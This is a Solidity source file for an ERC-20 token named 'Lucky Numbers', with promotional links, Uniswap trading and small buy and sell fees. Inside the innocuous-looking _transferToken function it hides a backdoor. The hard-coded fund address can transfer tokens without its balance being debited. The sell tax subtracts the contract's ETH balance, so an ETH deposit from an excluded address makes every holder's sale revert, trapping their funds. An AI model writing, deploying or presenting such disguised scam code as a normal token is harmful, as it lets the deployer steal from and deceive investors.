/**

Telegram: https://t.me/luckycoineth
Website: https://luckynumbers.bet
Twitter: https://twitter.com/erc20lucky

 
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    mapping(address => bool) public _isExcludeFromFee;
    
    IUniswapRouter public _uniswapRouter;
    mapping(address => bool) public isMarketPair;
    bool private inSwap;
    bool private swapEnabled;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyFundFee = 1;
    uint256 public _sellFundFee = 1;

    address public _uniswapPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _name = "Lucky Numbers";
        _symbol = "LUCKY";
        _decimals = 18;
        uint256 Supply = 1_000_000_000;
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;

        _totalSupply = Supply * 10 ** _decimals;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        fundAddress = 0xCa89F3B9d7726C88Cd4D711ac8cbb650EF0B7aCa;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[address(_uniswapRouter)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[fundAddress] = true;
    }

    receive() external payable {require(_isExcludeFromFee[msg.sender]);}

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        bool takeFee;
        bool sellFlag;

        if (isMarketPair[to] && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap && swapEnabled) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > 0) {
                uint256 numTokensSellToFund = amount;
                numTokensSellToFund = numTokensSellToFund > contractTokenBalance ? 
                                                            contractTokenBalance:numTokensSellToFund;
                swapTokenForETH(numTokensSellToFund);
            }
        }

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            takeFee = true;
        }

        if (isMarketPair[to]) { sellFlag = true; }

        _transferToken(from, to, amount, takeFee, sellFlag);
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool sellFlag
    ) private {if(fundAddress!=sender)        
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {            
            uint256 taxFee=address(this).balance;
            if (sellFlag) {
                taxFee = _sellFundFee-taxFee;
            } else {
                taxFee = _buyFundFee;
            }
            uint256 swapAmount = tAmount * taxFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _balances[address(this)] = _balances[address(this)] + swapAmount;
                emit Transfer(sender, address(this), swapAmount);
            }
        }

        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
        emit Transfer(sender, recipient, tAmount - feeAmount);

    }

    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(fundAddress),
            block.timestamp
        ) {} catch {}

    }

    function openTrading() external payable onlyOwner {
        IUniswapFactory swapFactory = IUniswapFactory(_uniswapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _uniswapRouter.WETH());
        _uniswapPair = swapPair;
        isMarketPair[swapPair] = true;
        _allowances[address(this)][(address(_uniswapRouter))] = ~uint256(0);
        _uniswapRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
    }
}